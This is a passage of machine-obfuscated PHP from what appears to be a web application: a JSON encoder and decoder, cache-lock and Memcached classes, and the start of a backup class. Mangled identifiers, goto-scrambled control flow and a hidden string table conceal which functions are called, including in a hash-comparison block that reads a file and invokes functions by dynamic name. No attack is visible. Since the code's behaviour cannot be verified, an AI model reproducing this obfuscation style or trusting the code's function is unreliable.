"\x28{$B˜…åÆ³È™}\x29{$A–‚ŒªÍø}"; if (!in_array_not_case($a­ê¦¤¶«ˆ, $d—¬Âİ¯ÖÕ)) { return $a­ê¦¤¶«ˆ; } } } } goto A‰ô¼ëœÊ‰; bïÒªÍç«ç: function beforeShutdown() { Hook::trigger($_SERVER[©•ÖÏ¥Ø][36]); } $_SERVER[$_SERVER[©•ÖÏ¥Ø][37]] = BASIC_PATH; $_SERVER[$_SERVER[©•ÖÏ¥Ø][38]] = LIB_DIR; goto b‡øåæ²–; eÖô³„—½³: define($_SERVER[îÖ][1931], 16); define($_SERVER[îÖ][1932], 32); class Services_JSON { function __construct($Dó‘¶²ÉÉÍ = 0) { $this->use = $Dó‘¶²ÉÉÍ; } function utf162utf8($E„éÏè‡áƒ) { $A„Ç÷¯‰” =& $_SERVER[îÖ]; if (function_exists($A„Ç÷¯‰”[68])) { return mb_convert_encoding($E„éÏè‡áƒ, $A„Ç÷¯‰”[1584], $A„Ç÷¯‰”[1933]); } $DöÚù„Ã­ğ = ord($E„éÏè‡áƒ[0]) << 8 | ord($E„éÏè‡áƒ[1]); switch (!0) { case (127 & $DöÚù„Ã­ğ) == $DöÚù„Ã­ğ: return chr(127 & $DöÚù„Ã­ğ); case (2047 & $DöÚù„Ã­ğ) == $DöÚù„Ã­ğ: return chr(192 | $DöÚù„Ã­ğ >> 6 & 31) . chr(128 | $DöÚù„Ã­ğ & 63); case (65535 & $DöÚù„Ã­ğ) == $DöÚù„Ã­ğ: return chr(224 | $DöÚù„Ã­ğ >> 12 & 15) . chr(128 | $DöÚù„Ã­ğ >> 6 & 63) . chr(128 | $DöÚù„Ã­ğ & 63); } return $A„Ç÷¯‰”[33]; } function utf82utf16($D™´³Û™‚é) { $AœÆœäª¡á =& $_SERVER[îÖ]; if (function_exists($AœÆœäª¡á[68])) { return mb_convert_encoding($D™´³Û™‚é, $AœÆœäª¡á[1933], $AœÆœäª¡á[1584]); } switch (strlen($D™´³Û™‚é)) { case 1: return $D™´³Û™‚é; case 2: return chr(7 & ord($D™´³Û™‚é[0]) >> 2) . chr(192 & ord($D™´³Û™‚é[0]) << 6 | 63 & ord($D™´³Û™‚é[1])); case 3: return chr(240 & ord($D™´³Û™‚é[0]) << 4 | 15 & ord($D™´³Û™‚é[1]) >> 2) . chr(192 & ord($D™´³Û™‚é[1]) << 6 | 127 & ord($D™´³Û™‚é[2])); } return $AœÆœäª¡á[33]; } function encode($D‡†Û‰Ğ«²) { $C¶Û¦¨’ëÓ =& $_SERVER[îÖ]; switch (gettype($D‡†Û‰Ğ«²)) { case $C¶Û¦¨’ëÓ[1595]: return $D‡†Û‰Ğ«² ? $C¶Û¦¨’ëÓ[1594] : $C¶Û¦¨’ëÓ[1596]; case $C¶Û¦¨’ëÓ[1934]: return $C¶Û¦¨’ëÓ[99]; case $C¶Û¦¨’ëÓ[303]: return (int) $D‡†Û‰Ğ«²; case $C¶Û¦¨’ëÓ[278]: case $C¶Û¦¨’ëÓ[277]: return (double) $D‡†Û‰Ğ«²; case $C¶Û¦¨’ëÓ[312]: $CíèÂŠù‹ = $C¶Û¦¨’ëÓ[33]; $b†à¹¼Šº = strlen($D‡†Û‰Ğ«²); for ($c¬‹ÔêèŠ” = 0; $c¬‹ÔêèŠ” < $b†à¹¼Šº; ++$c¬‹ÔêèŠ”) { $a‡İ¢’£Îè = ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ”]); switch (!0) { case $a‡İ¢’£Îè == 8: $CíèÂŠù‹ .= $C¶Û¦¨’ëÓ[1935]; break; case $a‡İ¢’£Îè == 9: $CíèÂŠù‹ .= $C¶Û¦¨’ëÓ[1571]; break; case $a‡İ¢’£Îè == 10: $CíèÂŠù‹ .= $C¶Û¦¨’ëÓ[1569]; break; case $a‡İ¢’£Îè == 12: $CíèÂŠù‹ .= $C¶Û¦¨’ëÓ[1936]; break; case $a‡İ¢’£Îè == 13: $CíèÂŠù‹ .= $C¶Û¦¨’ëÓ[1570]; break; case $a‡İ¢’£Îè == 34: case $a‡İ¢’£Îè == 47: case $a‡İ¢’£Îè == 92: $CíèÂŠù‹ .= $C¶Û¦¨’ëÓ[93] . $D‡†Û‰Ğ«²[$c¬‹ÔêèŠ”]; break; case $a‡İ¢’£Îè >= 32 && $a‡İ¢’£Îè <= 127: $CíèÂŠù‹ .= $D‡†Û‰Ğ«²[$c¬‹ÔêèŠ”]; break; case ($a‡İ¢’£Îè & 224) == 192: $eƒ±Ğåğ¶Ş = pack($C¶Û¦¨’ëÓ[1937], $a‡İ¢’£Îè, ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 1])); $c¬‹ÔêèŠ” += 1; $bãéÇ = $this->utf82utf16($eƒ±Ğåğ¶Ş); $CíèÂŠù‹ .= sprintf($C¶Û¦¨’ëÓ[1938], bin2hex($bãéÇ)); break; case ($a‡İ¢’£Îè & 240) == 224: $eƒ±Ğåğ¶Ş = pack($C¶Û¦¨’ëÓ[1937], $a‡İ¢’£Îè, ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 1]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 2])); $c¬‹ÔêèŠ” += 2; $bãéÇ = $this->utf82utf16($eƒ±Ğåğ¶Ş); $CíèÂŠù‹ .= sprintf($C¶Û¦¨’ëÓ[1938], bin2hex($bãéÇ)); break; case ($a‡İ¢’£Îè & 248) == 240: $eƒ±Ğåğ¶Ş = pack($C¶Û¦¨’ëÓ[1937], $a‡İ¢’£Îè, ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 1]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 2]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 3])); $c¬‹ÔêèŠ” += 3; $bãéÇ = $this->utf82utf16($eƒ±Ğåğ¶Ş); $CíèÂŠù‹ .= sprintf($C¶Û¦¨’ëÓ[1938], bin2hex($bãéÇ)); break; case ($a‡İ¢’£Îè & 252) == 248: $eƒ±Ğåğ¶Ş = pack($C¶Û¦¨’ëÓ[1937], $a‡İ¢’£Îè, ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 1]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 2]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 3]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 4])); $c¬‹ÔêèŠ” += 4; $bãéÇ = $this->utf82utf16($eƒ±Ğåğ¶Ş); $CíèÂŠù‹ .= sprintf($C¶Û¦¨’ëÓ[1938], bin2hex($bãéÇ)); break; case ($a‡İ¢’£Îè & 254) == 252: $eƒ±Ğåğ¶Ş = pack($C¶Û¦¨’ëÓ[1937], $a‡İ¢’£Îè, ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 1]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 2]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 3]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 4]), ord($D‡†Û‰Ğ«²[$c¬‹ÔêèŠ” + 5])); $c¬‹ÔêèŠ” += 5; $bãéÇ = $this->utf82utf16($eƒ±Ğåğ¶Ş); $CíèÂŠù‹ .= sprintf($C¶Û¦¨’ëÓ[1938], bin2hex($bãéÇ)); break; } } return $C¶Û¦¨’ëÓ[113] . $CíèÂŠù‹ . $C¶Û¦¨’ëÓ[113]; case $C¶Û¦¨’ëÓ[1939]: if (is_array($D‡†Û‰Ğ«²) && count($D‡†Û‰Ğ«²) && array_keys($D‡†Û‰Ğ«²) !== range(0, sizeof($D‡†Û‰Ğ«²) - 1)) { $DÍ´Òçœß = array_map(array($this, $C¶Û¦¨’ëÓ[1940]), array_keys($D‡†Û‰Ğ«²), array_values($D‡†Û‰Ğ«²)); foreach ($DÍ´Òçœß as $bøÇÖÊ¨Ú›) { if (Services_JSON::isError($bøÇÖÊ¨Ú›)) { return $bøÇÖÊ¨Ú›; } } return $C¶Û¦¨’ëÓ[1062] . join($C¶Û¦¨’ëÓ[47], $DÍ´Òçœß) . $C¶Û¦¨’ëÓ[315]; } $aÖ¦½ÄÁ¥Î = array_map(array($this, $C¶Û¦¨’ëÓ[1941]), $D‡†Û‰Ğ«²); foreach ($aÖ¦½ÄÁ¥Î as $d‚«–ô½Ú) { if (Services_JSON::isError($d‚«–ô½Ú)) { return $d‚«–ô½Ú; } } return $C¶Û¦¨’ëÓ[157] . join($C¶Û¦¨’ëÓ[47], $aÖ¦½ÄÁ¥Î) . $C¶Û¦¨’ëÓ[476]; case $C¶Û¦¨’ëÓ[1942]: $C‰öÀÅ·½ë = get_object_vars($D‡†Û‰Ğ«²); $DÍ´Òçœß = array_map(array($this, $C¶Û¦¨’ëÓ[1940]), array_keys($C‰öÀÅ·½ë), array_values($C‰öÀÅ·½ë)); foreach ($DÍ´Òçœß as $bøÇÖÊ¨Ú›) { if (Services_JSON::isError($bøÇÖÊ¨Ú›)) { return $bøÇÖÊ¨Ú›; } } return $C¶Û¦¨’ëÓ[1062] . join($C¶Û¦¨’ëÓ[47], $DÍ´Òçœß) . $C¶Û¦¨’ëÓ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $C¶Û¦¨’ëÓ[99] : new Services_JSON_Error(gettype($D‡†Û‰Ğ«²) . $C¶Û¦¨’ëÓ[1943]); } } function name_value($aã…Û‹øì, $d±œ¿çë³Ü) { $D‰­Îšäºù = $this->encode($d±œ¿çë³Ü); if (Services_JSON::isError($D‰­Îšäºù)) { return $D‰­Îšäºù; } return $this->encode(strval($aã…Û‹øì)) . $_SERVER[îÖ][4] . $D‰­Îšäºù; } function reduce_string($A®ç¬Óä ) { $e·¹æË‚ÀÌ =& $_SERVER[îÖ]; $A®ç¬Óä  = preg_replace(array($e·¹æË‚ÀÌ[1944], $e·¹æË‚ÀÌ[1945], $e·¹æË‚ÀÌ[1946]), $e·¹æË‚ÀÌ[33], $A®ç¬Óä ); return trim($A®ç¬Óä ); } function decode($D¸åØÎ¦í§) { $e—ˆÙÓ£¾« =& $_SERVER[îÖ]; $D¸åØÎ¦í§ = $this->reduce_string($D¸åØÎ¦í§); switch (strtolower($D¸åØÎ¦í§)) { case $e—ˆÙÓ£¾«[1594]: return !0; case $e—ˆÙÓ£¾«[1596]: return !1; case $e—ˆÙÓ£¾«[99]: return null; default: $FÂŞ‹”ä¥ = array(); if (is_numeric($D¸åØÎ¦í§)) { return (double) $D¸åØÎ¦í§ == (int) $D¸åØÎ¦í§ ? (int) $D¸åØÎ¦í§ : (double) $D¸åØÎ¦í§; } elseif (preg_match($e—ˆÙÓ£¾«[1947], $D¸åØÎ¦í§, $FÂŞ‹”ä¥) && $FÂŞ‹”ä¥[1] == $FÂŞ‹”ä¥[2]) { $cùšĞ±Ê  = substr($D¸åØÎ¦í§, 0, 1); $fšâ¬·ë™ = substr($D¸åØÎ¦í§, 1, -1); $Dëß‹¥·–Ó = $e—ˆÙÓ£¾«[33]; $D…Ø’ÂÓ¦½ = strlen($fšâ¬·ë™); for ($a‹ã¹Ì±½ğ = 0; $a‹ã¹Ì±½ğ < $D…Ø’ÂÓ¦½; ++$a‹ã¹Ì±½ğ) { $fŸè¥Ù¢Ğ = substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 2); $Cˆ×öÓƒ¶· = ord($fšâ¬·ë™[$a‹ã¹Ì±½ğ]); switch (!0) { case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1935]: $Dëß‹¥·–Ó .= chr(8); ++$a‹ã¹Ì±½ğ; break; case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1571]: $Dëß‹¥·–Ó .= chr(9); ++$a‹ã¹Ì±½ğ; break; case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1569]: $Dëß‹¥·–Ó .= chr(10); ++$a‹ã¹Ì±½ğ; break; case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1936]: $Dëß‹¥·–Ó .= chr(12); ++$a‹ã¹Ì±½ğ; break; case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1570]: $Dëß‹¥·–Ó .= chr(13); ++$a‹ã¹Ì±½ğ; break; case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1351]: case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1948]: case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1564]: case $fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1566]: if ($cùšĞ±Ê  == $e—ˆÙÓ£¾«[113] && $fŸè¥Ù¢Ğ != $e—ˆÙÓ£¾«[1948] || $cùšĞ±Ê  == $e—ˆÙÓ£¾«[55] && $fŸè¥Ù¢Ğ != $e—ˆÙÓ£¾«[1351]) { $Dëß‹¥·–Ó .= $fšâ¬·ë™[++$a‹ã¹Ì±½ğ]; } break; case preg_match($e—ˆÙÓ£¾«[1949], substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 6)): $d¸¢øìòŸõ = chr(hexdec(substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ + 2, 2))) . chr(hexdec(substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ + 4, 2))); $Dëß‹¥·–Ó .= $this->utf162utf8($d¸¢øìòŸõ); $a‹ã¹Ì±½ğ += 5; break; case $Cˆ×öÓƒ¶· >= 32 && $Cˆ×öÓƒ¶· <= 127: $Dëß‹¥·–Ó .= $fšâ¬·ë™[$a‹ã¹Ì±½ğ]; break; case ($Cˆ×öÓƒ¶· & 224) == 192: $Dëß‹¥·–Ó .= substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 2); ++$a‹ã¹Ì±½ğ; break; case ($Cˆ×öÓƒ¶· & 240) == 224: $Dëß‹¥·–Ó .= substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 3); $a‹ã¹Ì±½ğ += 2; break; case ($Cˆ×öÓƒ¶· & 248) == 240: $Dëß‹¥·–Ó .= substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 4); $a‹ã¹Ì±½ğ += 3; break; case ($Cˆ×öÓƒ¶· & 252) == 248: $Dëß‹¥·–Ó .= substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 5); $a‹ã¹Ì±½ğ += 4; break; case ($Cˆ×öÓƒ¶· & 254) == 252: $Dëß‹¥·–Ó .= substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 6); $a‹ã¹Ì±½ğ += 5; break; } } return $Dëß‹¥·–Ó; } elseif (preg_match($e—ˆÙÓ£¾«[1950], $D¸åØÎ¦í§) || preg_match($e—ˆÙÓ£¾«[1951], $D¸åØÎ¦í§)) { goto f“×‰¢ºÇ; bêÉßñ‹Ôç: $fšâ¬·ë™ = $this->reduce_string($fšâ¬·ë™); if ($fšâ¬·ë™ == $e—ˆÙÓ£¾«[33]) { if (reset($eÁ ßô‘í®) == SERVICES_JSON_IN_ARR) { return $EÏÔ¨õ’ˆ; } else { return $aõóµêÑã; } } $D…Ø’ÂÓ¦½ = strlen($fšâ¬·ë™); goto DôùáÛ‰éÑ; f“×‰¢ºÇ: if ($D¸åØÎ¦í§[0] == $e—ˆÙÓ£¾«[157]) { $eÁ ßô‘í® = array(SERVICES_JSON_IN_ARR); $EÏÔ¨õ’ˆ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eÁ ßô‘í® = array(SERVICES_JSON_IN_OBJ); $aõóµêÑã = array(); } else { $eÁ ßô‘í® = array(SERVICES_JSON_IN_OBJ); $aõóµêÑã = new stdClass(); } } array_push($eÁ ßô‘í®, array($e—ˆÙÓ£¾«[1952] => SERVICES_JSON_SLICE, $e—ˆÙÓ£¾«[263] => 0, $e—ˆÙÓ£¾«[1953] => !1)); $fšâ¬·ë™ = substr($D¸åØÎ¦í§, 1, -1); goto bêÉßñ‹Ôç; DôùáÛ‰éÑ: for ($a‹ã¹Ì±½ğ = 0; $a‹ã¹Ì±½ğ <= $D…Ø’ÂÓ¦½; ++$a‹ã¹Ì±½ğ) { $C†Ş¶ÁÍÎ = end($eÁ ßô‘í®); $fŸè¥Ù¢Ğ = substr($fšâ¬·ë™, $a‹ã¹Ì±½ğ, 2); if ($a‹ã¹Ì±½ğ == $D…Ø’ÂÓ¦½ || $fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[47] && $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]] == SERVICES_JSON_SLICE) { $eÛÎöÀ±ª = substr($fšâ¬·ë™, $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[263]], $a‹ã¹Ì±½ğ - $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[263]]); array_push($eÁ ßô‘í®, array($e—ˆÙÓ£¾«[1952] => SERVICES_JSON_SLICE, $e—ˆÙÓ£¾«[263] => $a‹ã¹Ì±½ğ + 1, $e—ˆÙÓ£¾«[1953] => !1)); if (reset($eÁ ßô‘í®) == SERVICES_JSON_IN_ARR) { array_push($EÏÔ¨õ’ˆ, $this->decode($eÛÎöÀ±ª)); } elseif (reset($eÁ ßô‘í®) == SERVICES_JSON_IN_OBJ) { $dá„™¦õèÄ = array(); if (preg_match($e—ˆÙÓ£¾«[1954], $eÛÎöÀ±ª, $dá„™¦õèÄ)) { $e–Èƒ÷‰Šó = $this->decode($dá„™¦õèÄ[1]); $B–Î½½Ó  = $this->decode($dá„™¦õèÄ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aõóµêÑã[$e–Èƒ÷‰Šó] = $B–Î½½Ó ; } else { $aõóµêÑã->{$e–Èƒ÷‰Šó} = $B–Î½½Ó ; } } elseif (preg_match($e—ˆÙÓ£¾«[1955], $eÛÎöÀ±ª, $dá„™¦õèÄ)) { $e–Èƒ÷‰Šó = $dá„™¦õèÄ[1]; $B–Î½½Ó  = $this->decode($dá„™¦õèÄ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $aõóµêÑã[$e–Èƒ÷‰Šó] = $B–Î½½Ó ; } else { $aõóµêÑã->{$e–Èƒ÷‰Šó} = $B–Î½½Ó ; } } } } elseif (($fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[113] || $fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[55]) && $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]] != SERVICES_JSON_IN_STR) { array_push($eÁ ßô‘í®, array($e—ˆÙÓ£¾«[1952] => SERVICES_JSON_IN_STR, $e—ˆÙÓ£¾«[263] => $a‹ã¹Ì±½ğ, $e—ˆÙÓ£¾«[1953] => $fšâ¬·ë™[$a‹ã¹Ì±½ğ])); } elseif ($fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1953]] && $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]] == SERVICES_JSON_IN_STR && (strlen(substr($fšâ¬·ë™, 0, $a‹ã¹Ì±½ğ)) - strlen(rtrim(substr($fšâ¬·ë™, 0, $a‹ã¹Ì±½ğ), $e—ˆÙÓ£¾«[93]))) % 2 != 1) { array_pop($eÁ ßô‘í®); } elseif ($fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[157] && in_array($C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eÁ ßô‘í®, array($e—ˆÙÓ£¾«[1952] => SERVICES_JSON_IN_ARR, $e—ˆÙÓ£¾«[263] => $a‹ã¹Ì±½ğ, $e—ˆÙÓ£¾«[1953] => !1)); } elseif ($fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[476] && $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]] == SERVICES_JSON_IN_ARR) { array_pop($eÁ ßô‘í®); } elseif ($fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[1062] && in_array($C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eÁ ßô‘í®, array($e—ˆÙÓ£¾«[1952] => SERVICES_JSON_IN_OBJ, $e—ˆÙÓ£¾«[263] => $a‹ã¹Ì±½ğ, $e—ˆÙÓ£¾«[1953] => !1)); } elseif ($fšâ¬·ë™[$a‹ã¹Ì±½ğ] == $e—ˆÙÓ£¾«[315] && $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]] == SERVICES_JSON_IN_OBJ) { array_pop($eÁ ßô‘í®); } elseif ($fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1956] && in_array($C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($eÁ ßô‘í®, array($e—ˆÙÓ£¾«[1952] => SERVICES_JSON_IN_CMT, $e—ˆÙÓ£¾«[263] => $a‹ã¹Ì±½ğ, $e—ˆÙÓ£¾«[1953] => !1)); $a‹ã¹Ì±½ğ++; } elseif ($fŸè¥Ù¢Ğ == $e—ˆÙÓ£¾«[1957] && $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[1952]] == SERVICES_JSON_IN_CMT) { array_pop($eÁ ßô‘í®); $a‹ã¹Ì±½ğ++; for ($F²½åø¢çˆ = $C†Ş¶ÁÍÎ[$e—ˆÙÓ£¾«[263]]; $F²½åø¢çˆ <= $a‹ã¹Ì±½ğ; ++$F²½åø¢çˆ) { $fšâ¬·ë™ = substr_replace($fšâ¬·ë™, $e—ˆÙÓ£¾«[50], $F²½åø¢çˆ, 1); } } } if (reset($eÁ ßô‘í®) == SERVICES_JSON_IN_ARR) { return $EÏÔ¨õ’ˆ; } elseif (reset($eÁ ßô‘í®) == SERVICES_JSON_IN_OBJ) { return $aõóµêÑã; } goto eìÀñ›Ğ²; eìÀñ›Ğ²: } } } function isError($b µ¤‡ã”Õ, $cŠÊ¯ßœç¨ = null) { $dÜŞ†ôƒñœ =& $_SERVER[îÖ]; if (class_exists($dÜŞ†ôƒñœ[1958])) { return PEAR::isError($b µ¤‡ã”Õ, $cŠÊ¯ßœç¨); } elseif (is_object($b µ¤‡ã”Õ) && (get_class($b µ¤‡ã”Õ) == $dÜŞ†ôƒñœ[1959] || is_subclass_of($b µ¤‡ã”Õ, $dÜŞ†ôƒñœ[1959]))) { return !0; } return !1; } } goto e‘óƒ¹†öÄ; d“Ú•Î„ö¼: class CacheLockMemcached { public function lock($B½¾ÂÊ›¾ï, $fõ‹ºÌâ‹¦ = 0) { $D‡†ÒŸ‘ÉÙ = Cache::init(); $FŠ³ã®ì‡ = microtime(!0) + $fõ‹ºÌâ‹¦; while (microtime(!0) < $FŠ³ã®ì‡) { $b‚Ÿ”Æ¡© = $D‡†ÒŸ‘ÉÙ->get($B½¾ÂÊ›¾ï); if (!$b‚Ÿ”Æ¡© || $b‚Ÿ”Æ¡© < microtime(!0)) { $A÷Å¡¿•Ñ = $D‡†ÒŸ‘ÉÙ->handle->add($B½¾ÂÊ›¾ï, $FŠ³ã®ì‡, $fõ‹ºÌâ‹¦); if ($A÷Å¡¿•Ñ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BÒµ­ËŸÃ†) { return Cache::init()->get($BÒµ­ËŸÃ†); } public function unlock($F‡ºŸš´Â©) { return Cache::init()->remove($F‡ºŸš´Â©); } } class CacheLockDatabase { public function lock($B§º©Æ·‹, $aä‚äéØò = 0) { $f—ºÕøâí = Model($_SERVER[îÖ][756]); $DÒ¨“êäŸí = microtime(!0) + $aä‚äéØò; while (microtime(!0) < $DÒ¨“êäŸí) { $fá¤„¯ßŒ¡ = $f—ºÕøâí->get($B§º©Æ·‹); if (!$fá¤„¯ßŒ¡ || $fá¤„¯ßŒ¡ < microtime(!0)) { $D¸Õ¦©Î ¡ = $f—ºÕøâí->set($B§º©Æ·‹, $DÒ¨“êäŸí); if ($D¸Õ¦©Î ¡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fò÷§”Åë) { return Model($_SERVER[îÖ][756])->get($fò÷§”Åë); } public function unlock($aÀµÕ½ë‰¨) { Model($_SERVER[îÖ][756])->remove($aÀµÕ½ë‰¨); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dÖó·–ï«, $CŠÔµ°¤Ú) { $a¨¾ŒéÇ¾Ô =& $_SERVER[îÖ]; if (!class_exists($a¨¾ŒéÇ¾Ô[777])) { show_json($a¨¾ŒéÇ¾Ô[778], !1); } $this->cacheTime = $CŠÔµ°¤Ú; $this->handle = new Memcached(); if (is_array($dÖó·–ï«[$a¨¾ŒéÇ¾Ô[779]]) && count($dÖó·–ï«[$a¨¾ŒéÇ¾Ô[779]]) >= 1) { foreach ($dÖó·–ï«[$a¨¾ŒéÇ¾Ô[779]] as $c±°Òóƒ‹) { $d‡ÎÀÖÕò§ = explode($a¨¾ŒéÇ¾Ô[4], $c±°Òóƒ‹); $this->handle->addServer($d‡ÎÀÖÕò§[0], $d‡ÎÀÖÕò§[1]); } } else { $this->handle->addServer($dÖó·–ï«[$a¨¾ŒéÇ¾Ô[169]], $dÖó·–ï«[$a¨¾ŒéÇ¾Ô[170]]); } } public function set($e©˜êç§ßÒ, $eè¸®³®²ß, $bõœ¶„¶ï­ = false) { $bõœ¶„¶ï­ = $bõœ¶„¶ï­ ? $bõœ¶„¶ï­ : $this->cacheTime; return $this->handle->set($e©˜êç§ßÒ, $eè¸®³®²ß, $bõœ¶„¶ï­); } public function get($Cé½ÎŞ¶¨Ê) { return $this->handle->get($Cé½ÎŞ¶¨Ê); } public function remove($CùÙ…§¦Ë) { return $this->handle->delete($CùÙ…§¦Ë); } public function deleteAll() { return $this->handle->flush(); } } goto c´æ‰âŒÇ–; dàÆæ‚Äˆ: $Cƒéƒ™ŞÎÜ = $_SERVER[îÖ][679]; if ($_SERVER[$_SERVER[îÖ][680]] != $Cƒéƒ™ŞÎÜ($CìÂÜËù´)) { goto dñ‰£—÷¾Í; eì£ß¨ã¡á: $dê¨™œÄ‡ = explode($_SERVER[îÖ][217], $c¯ÙÇøæŒÚ); if (count($dê¨™œÄ‡) < $_SERVER[îÖ][564]) { $AĞ±ÈÑÕè = $_SERVER[îÖ][684]; $AĞ±ÈÑÕè(); } $AÄ˜«åéæ¯ = $_SERVER[îÖ][685]; goto cœ·íÖò·ƒ; cœ·íÖò·ƒ: $AÄ˜«åéæ¯($CìÂÜËù´); goto Fµ—Ê´¦Õí; dñ‰£—÷¾Í: $aÈ¼ÄÁ‘º„ = $_SERVER[îÖ][681]; $cëë—ƒÊ = $_SERVER[$_SERVER[îÖ][682]] . $_SERVER[îÖ][683]; $c¯ÙÇøæŒÚ = $aÈ¼ÄÁ‘º„($cëë—ƒÊ); goto eì£ß¨ã¡á; Fµ—Ê´¦Õí: } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $B´âö©Š•Ñ =& $_SERVER[îÖ]; self::$name = date($B´âö©Š•Ñ[686]); if (!($d¤êó¹¥˜ = Model($B´âö©Š•Ñ[687])->lastItem())) { $d¤êó¹¥˜ = $this->initData(); } else { self::$name = $d¤êó¹¥˜[$B´âö©Š•Ñ[28]]; if ($d¤êó¹¥˜[$B´âö©Š•Ñ[688]] == $B´âö©Š•Ñ[83]) { self::$name = date($B´âö©Š•Ñ[689]); $aåÛŠ„¿»‘ = 0; if (isset($d¤êó¹¥˜[$B´âö©Š•Ñ[281]][$B´âö©Š•Ñ[167]][$B´âö©Š•Ñ[419]])) { $aåÛŠ„¿»‘ = (int) $d¤êó¹¥˜[$B´âö©Š•Ñ[281]][$B´âö©Š•Ñ[167]][$B´âö©Š•Ñ[419]]; } if ($d¤êó¹¥˜[$B´âö©Š•Ñ[28]] == self::$name) { Model($B´âö©Š•Ñ[687])->remove($d¤êó¹¥˜[$B´âö©Š•Ñ[367]]); } $d¤êó¹¥˜ = $this->initData($aåÛŠ„¿»‘, $d¤êó¹¥˜[$B´âö©Š•Ñ[690]]); } else { $this->checkStore($d¤êó¹¥˜[$B´âö©Š•Ñ[690]]); } } self::$option = $d¤êó¹¥˜; } private function initData($a††¤»Ñ¿• = 0, $FŠ¬Ê›Ò = '') { goto C”’³²Ú; C”’³²Ú: $F“×†ƒ„¶ =& $_SERVER[îÖ]; $bÚŒŒŞÅ¨„ = Model($F“×†ƒ„¶[687])->config(); if ($FŠ¬Ê›Ò && $bÚŒŒŞÅ¨„[$F“×†ƒ„¶[690]] != $FŠ¬Ê›Ò) { $a††¤»Ñ¿• = 0; } goto D¶êñÚ±›ß; D¶êñÚ±›ß: $this->checkStore($bÚŒŒŞÅ¨„[$F“×†ƒ„¶[690]]); $e®Ôœ¥÷À = array($F“×†ƒ„¶[690] => $bÚŒŒŞÅ¨„[$F“×†ƒ„¶[690]], $F“×†ƒ„¶[28] => self::$name, $F“×†ƒ„¶[688] => 0, $F“×†ƒ„¶[691] => $bÚŒŒŞÅ¨„[$F“×†ƒ„¶[691]], $F“×†ƒ„¶[281] => array($F“×†ƒ„¶[692] => array($F“×†ƒ„¶[688] => 0), $F“×†ƒ„¶[693] => array($F“×†ƒ„¶[688] => 0, $F“×†ƒ„¶[694] => 0, $F“×†ƒ„¶[695] => 0, $F“×†ƒ„¶[29] => $F“×†ƒ„¶[33]), $F“×†ƒ„¶[696] => 